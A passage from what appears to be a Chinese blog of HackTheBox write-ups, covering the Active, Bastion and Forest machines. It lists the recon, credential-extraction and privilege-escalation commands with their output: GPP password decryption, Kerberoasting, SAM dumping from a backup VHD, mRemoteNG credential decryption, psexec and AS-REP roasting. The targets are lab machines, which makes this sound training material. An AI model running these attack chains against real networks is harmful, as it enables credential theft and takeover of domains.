class="line">49153/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-7"><a class="markdownIt-Anchor" href="#漏洞利用-7"></a> 漏洞利用</h2>
<p>开了53端口，基本确定是台DC</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.10.100</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.10.100</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"> ====================================== </span><br><span class="line">|    OS information on 10.10.10.100    |</span><br><span class="line"> ====================================== </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 458.</span><br><span class="line">Use of uninitialized value <span class="variable">$os_info</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info <span class="keyword">for</span> 10.10.10.100 from smbclient: </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 467.</span><br><span class="line">[+] Got OS info <span class="keyword">for</span> 10.10.10.100 from srvinfo:</span><br><span class="line">	10.10.10.100   Wk Sv PDC Tim NT     Domain Controller</span><br><span class="line">	platform_id     :	500</span><br><span class="line">	os version      :	6.1</span><br><span class="line">	server <span class="built_in">type</span>     :	0x80102b</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"> ========================================= </span><br><span class="line">|    Share Enumeration on 10.10.10.100    |</span><br><span class="line"> ========================================= </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 640.</span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	ADMIN$          Disk      Remote Admin</span><br><span class="line">	attacker_folder Disk      </span><br><span class="line">	C$              Disk      Default share</span><br><span class="line">	IPC$            IPC       Remote IPC</span><br><span class="line">	NETLOGON        Disk      Logon server share </span><br><span class="line">	Replication     Disk      </span><br><span class="line">	SYSVOL          Disk      Logon server share </span><br><span class="line">	Users           Disk      </span><br></pre></td></tr></table></figure>
<p>应该可以匿名登录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.100</span><br><span class="line"></span><br><span class="line">	Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	attacker_folder                                   	NO ACCESS	</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	NO ACCESS	Remote IPC</span><br><span class="line">	NETLOGON                                          	NO ACCESS	Logon server share </span><br><span class="line">	Replication                                       	READ ONLY	</span><br><span class="line">	SYSVOL                                            	NO ACCESS	Logon server share </span><br><span class="line">	Users                                             	NO ACCESS	</span><br></pre></td></tr></table></figure>
<p>下载整个文件夹</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.100/Replication</span><br><span class="line">mask <span class="string">&quot;&quot;</span></span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget active.htb</span><br></pre></td></tr></table></figure>
<p>拿到GPP密文密码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat active.htb/Policies/&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;/MACHINE/Preferences/Groups</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;Groups clsid=<span class="string">&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;</span>&gt;&lt;User clsid=<span class="string">&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot;</span> name=<span class="string">&quot;active.htb\SVC_TGS&quot;</span> image=<span class="string">&quot;2&quot;</span> changed=<span class="string">&quot;2018-07-18 20:46:06&quot;</span> uid=<span class="string">&quot;&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;&quot;</span>&gt;&lt;Properties action=<span class="string">&quot;U&quot;</span> newName=<span class="string">&quot;&quot;</span> fullName=<span class="string">&quot;&quot;</span> description=<span class="string">&quot;&quot;</span> cpassword=<span class="string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span> changeLogon=<span class="string">&quot;0&quot;</span> noChange=<span class="string">&quot;1&quot;</span> neverExpires=<span class="string">&quot;1&quot;</span> acctDisabled=<span class="string">&quot;0&quot;</span> userName=<span class="string">&quot;active.htb\SVC_TGS&quot;</span>/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure>
<p>解密得到明文密码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><br><span class="line">GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>
<p>这里本来以为是用<code>evil-winrm</code>或者<code>psexec</code>Getshell的，没想到是smb登入<code>users</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18</span><br><span class="line">get svc_tgs\desktop\user.txt</span><br><span class="line"></span><br><span class="line">cat svc_tgs\\desktop\\user.txt </span><br><span class="line">86d67d8ba232bb6a254aa4d10159e983</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-7"><a class="markdownIt-Anchor" href="#权限提升-7"></a> 权限提升</h2>
<p>Kerberoasting</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile getuserspns.out</span><br></pre></td></tr></table></figure>
<p>（跑的时候出了个时间差过大的错误，头疼）<br />
同步时间</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -u 10.10.10.100</span><br></pre></td></tr></table></figure>
<p>爆破票据</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs getuserspns.out </span><br><span class="line"></span><br><span class="line">Ticketmaster1968 (?)</span><br></pre></td></tr></table></figure>
<p>查看SMB路径权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.100 -u administrator -p Ticketmaster1968</span><br><span class="line"></span><br><span class="line">	Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	READ, WRITE	Remote Admin</span><br><span class="line">	attacker_folder                                   	READ, WRITE	</span><br><span class="line">	C$                                                	READ, WRITE	Default share</span><br><span class="line">	IPC$                                              	NO ACCESS	Remote IPC</span><br><span class="line">	NETLOGON                                          	READ, WRITE	Logon server share </span><br><span class="line">	Replication                                       	READ ONLY	</span><br><span class="line">	SYSVOL                                            	READ, WRITE	Logon server share </span><br><span class="line">	Users</span><br></pre></td></tr></table></figure>
<p>有写权限，直接psexec</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py active.htb/administrator@10.10.10.100</span><br><span class="line">Ticketmaster1968</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> \users\administrator\desktop\root.txt</span><br><span class="line">b5fc76d1d6b91d77b2fbf2d54d0f708b</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hackthebox_bastion"><a class="markdownIt-Anchor" href="#hackthebox_bastion"></a> HackTheBox_Bastion</h1>
<h2 id="端口扫描-8"><a class="markdownIt-Anchor" href="#端口扫描-8"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.134</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.134</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="hackthebox_漏洞利用"><a class="markdownIt-Anchor" href="#hackthebox_漏洞利用"></a> HackTheBox_漏洞利用</h2>
<p>smbmap扫描路径</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.134 -u <span class="built_in">test</span></span><br><span class="line">	Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	Backups                                           	READ, WRITE	</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br></pre></td></tr></table></figure>
<p>可以看到有两个VHD文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.134/backups</span><br><span class="line"></span><br><span class="line">dir WindowsImageBackup\L4mpje-PC\&quot;Backup 2019-02-22 124351<span class="string">&quot;\</span></span><br><span class="line"><span class="string">  .                                  Dn        0  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  ..                                 Dn        0  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 20:44:03 2019</span></span><br><span class="line"><span class="string">  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  BackupSpecs.xml                    An     1186  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		7735807 blocks of size 4096. 2757267 blocks available</span></span><br></pre></td></tr></table></figure>
<p>先挂载SMB服务的文件，再将VHD文件挂载到本地磁盘</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/vhd</span><br><span class="line">mkdir /tmp/l4mpje-pc</span><br><span class="line">mount -t cifs //10.10.10.134/backups/WindowsImageBackup/L4mpje-PC  /tmp/l4mpje-pc/ -o user=anonymous</span><br><span class="line">modprobe nbd max_part=16</span><br><span class="line">qemu-nbd -r -c /dev/nbd0 <span class="string">&quot;/tmp/l4mpje-pc/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd&quot;</span></span><br><span class="line">mount -r /dev/nbd0p1 /tmp/vhd</span><br></pre></td></tr></table></figure>
<p>复制SAM文件和SYSTEM文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /tmp/vhd/Windows/System32/config/SYSTEM /root/</span><br><span class="line">cp /tmp/vhd/Windows/System32/config/SAM /root/</span><br></pre></td></tr></table></figure>
<p>取消挂载</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">umount /tmp/vhd</span><br><span class="line">qemu-nbd -d /dev/nbd0</span><br><span class="line">rmmod nbd</span><br><span class="line">umount /tmp/l4mpje-pc</span><br></pre></td></tr></table></figure>
<p>dump出Hash</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py <span class="built_in">local</span> -system /root/SYSTEM -sam /root/SAM</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
<p>解密得到明文</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">bureaulampje     (?)</span><br></pre></td></tr></table></figure>
<p>SSH登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">bureaulampje</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> Desktop\user.txt                                                                            </span><br><span class="line">9bfe57d5c3309db3a151772f9d86c6cd</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-8"><a class="markdownIt-Anchor" href="#权限提升-8"></a> 权限提升</h2>
<p>找到<code>mRemoteNG</code>程序的凭证储存</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml</span><br><span class="line"></span><br><span class="line">Username=<span class="string">&quot;Administrator&quot;</span> Domain=<span class="string">&quot;&quot;</span> Password=<span class="string">&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;</span></span><br></pre></td></tr></table></figure>
<p>还原管理员口令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/master/mremoteng_decrypt.py</span><br><span class="line">python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==</span><br><span class="line"></span><br><span class="line">Password: thXLHM96BeKL0ER2</span><br></pre></td></tr></table></figure>
<p>ssh登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh administrator@10.10.10.134</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line"><span class="built_in">type</span> \Users\Administrator\Desktop\root.txt                    </span><br><span class="line"></span><br><span class="line">958850b91811676ed6620a9c430e65c8</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hackthebox_forest"><a class="markdownIt-Anchor" href="#hackthebox_forest"></a> HackTheBox_Forest</h1>
<h2 id="端口扫描-9"><a class="markdownIt-Anchor" href="#端口扫描-9"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.161</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.161</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line">Not shown: 989 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">53/tcp   open  domain       Microsoft DNS</span><br><span class="line">88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-05 14:34:46Z)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-8"><a class="markdownIt-Anchor" href="#漏洞利用-8"></a> 漏洞利用</h2>
<p>还是DC</p>
<p>跑出来域名和一些用户名</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.10.161</span><br><span class="line"></span><br><span class="line"> =========================================== </span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> 10.10.10.161    |</span><br><span class="line"> =========================================== </span><br><span class="line">Domain Name: HTB</span><br><span class="line">Domain Sid: S-1-5-21-3072663084-364016917-1341370565</span><br><span class="line">[+] Host is part of a domain (not a workgroup)</span><br><span class="line"></span><br><span class="line">-----</span><br><span class="line"></span><br><span class="line"> ============================= </span><br><span class="line">|    Users on 10.10.10.161    |</span><br><span class="line"> ============================= </span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[<span class="variable">$331000</span>-VK4ADACQNUCA] rid:[0x463]</span><br><span class="line">user:[SM_2c8eef0a09b545acb] rid:[0x464]</span><br><span class="line">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]</span><br><span class="line">user:[SM_75a538d3025e4db9a] rid:[0x466]</span><br><span class="line">user:[SM_681f53d4942840e18] rid:[0x467]</span><br><span class="line">user:[SM_1b41c9286325456bb] rid:[0x468]</span><br><span class="line">user:[SM_9b69f1b9d2cc45549] rid:[0x469]</span><br><span class="line">user:[SM_7c96b981967141ebb] rid:[0x46a]</span><br><span class="line">user:[SM_c75ee099d0a64c91b] rid:[0x46b]</span><br><span class="line">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]</span><br><span class="line">user:[HealthMailboxc3d7722] rid:[0x46e]</span><br><span class="line">user:[HealthMailboxfc9daad] rid:[0x46f]</span><br><span class="line">user:[HealthMailboxc0a90c9] rid:[0x470]</span><br><span class="line">user:[HealthMailbox670628e] rid:[0x471]</span><br><span class="line">user:[HealthMailbox968e74d] rid:[0x472]</span><br><span class="line">user:[HealthMailbox6ded678] rid:[0x473]</span><br><span class="line">user:[HealthMailbox83d6781] rid:[0x474]</span><br><span class="line">user:[HealthMailboxfd87238] rid:[0x475]</span><br><span class="line">user:[HealthMailboxb01ac64] rid:[0x476]</span><br><span class="line">user:[HealthMailbox7108a4e] rid:[0x477]</span><br><span class="line">user:[HealthMailbox0659cc1] rid:[0x478]</span><br><span class="line">user:[sebastien] rid:[0x479]</span><br><span class="line">user:[lucinda] rid:[0x47a]</span><br><span class="line">user:[svc-alfresco] rid:[0x47b]</span><br><span class="line">user:[andy] rid:[0x47e]</span><br><span class="line">user:[mark] rid:[0x47f]</span><br><span class="line">user:[santi] rid:[0x480]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting">https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting</a></p>
</blockquote>
<p>AS-REP Roasting</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py HTB/svc-alfresco -request -no-pass -dc-ip 10.10.10.161</span><br><span class="line">Impacket v0.9.23.dev1 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> svc-alfresco</span><br><span class="line">$krb5asrep$23<span class="variable">$svc</span>-alfresco@HTB:74aacc88dcebdc99fbdfad38ea7bfb86<span class="variable">$0f390178e508b52f3547f4784f435ca5955e6086b719aab1723ec0d13c900d4b0b7e4a00c10162b5615fb8c93e90f34a1746b5de60400cac0a2eae9ecab1a1d16f1d41958d72811ba73835e3177ea538e77888a207a47537c83644879fa792b5d31b965dd75aef7409dc34ba0b2df67eb987db6779846f330d563277f97e004484f67e7a853beec8e7552b427ac4c43fabd3f523a365f80a43f90f587ee08bbc8d06ad907d9efc5a6541714f92fe3c7626dd539daa45d54a4ef5733579277c65f7d11ca380184131a767428ca62077e4553fd8d86d1e7340da4b41b115357485</span></span><br></pre></td></tr></table></figure>
<p>爆破口令明文</p>
